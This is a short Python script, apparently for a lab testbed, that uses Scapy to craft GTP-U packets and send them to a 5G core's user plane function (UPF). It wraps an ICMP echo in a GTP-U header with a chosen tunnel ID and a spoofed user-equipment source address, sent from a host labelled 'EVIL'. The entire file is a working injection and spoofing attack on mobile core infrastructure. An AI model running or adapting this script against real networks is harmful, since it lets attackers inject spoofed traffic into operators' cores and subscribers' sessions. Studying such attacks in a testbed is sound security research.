from scapy.all import *
from scapy.contrib.gtp import *
from scapy.layers.inet import IP, ICMP
import sys
from scapy.all import arping, get_if_list
import random
from src import ip_list


def new_seq(rand=False):
    return random.randint(0, 0xFFFF)


def start_gtp_uplink_attack(
    src_addr,
    upf_addr,
    teid,
    ue_addr,
    dst_addr,
    upf_dport=2152,
):

    ip_payload = (
        IP(src=ue_addr, dst=dst_addr)
        / ICMP(type=8, id=0x1234, seq=new_seq(True))
        # / b"ABCDEFGHIJKLMNOPQRSTUVWX"
    )

    gtpu_header = GTP_U_Header(teid=teid) / ip_payload

    packet = (
        IP(src=src_addr, dst=upf_addr)
        / UDP(dport=upf_dport, sport=upf_dport)
        / gtpu_header
    )

    print(
        f"[i]  Sending GTP-U packet to {dst_addr} through UPF ({upf_addr}), TEID {teid}, spoofing UE {ue_addr}, source IP {src_addr}"
    )

    send(packet)
    print("[+]  Packet sent successfully")


# ip_payload = IP(src=dst_addr, dst=ue_addr) / ICMP(type=8, id=0x1234, seq=new_seq(True)) / b"ABCDEFGHIJKLMNOPQRSTUVWX"

# gtpu_header = GTP_U_Header(teid=teid) upf_addrip_payload

# packet = IP(src=upf_addr, dst=gnb_addr) / UDP(dport=dport, sport=RandShort()) / gtpu_header

# logger.info(f"Sending GTP-U packet with TEID {hex(teid)} to {ue_addr} through the upf ({upf_addr})")

# send(packet)

# logger.success("Packet sent successfully")


if __name__ == "__main__":

    TEID = int(sys.argv[1], 0)
    DST_ADDR = sys.argv[3]
    UE_ADDR = sys.argv[2]

    GNB_ADDR = sys.argv[4]

    DPORT = 2152

    print(f"[i]  Interfaces: {get_if_list()}")

    arping(ip_list["UPF"])

    start_gtp_uplink_attack(
        src_addr=ip_list["EVIL"],
        upf_addr=ip_list["UPF"],
        teid=TEID,
        ue_addr=UE_ADDR,
        dst_addr=DST_ADDR,
        upf_dport=DPORT,
    )
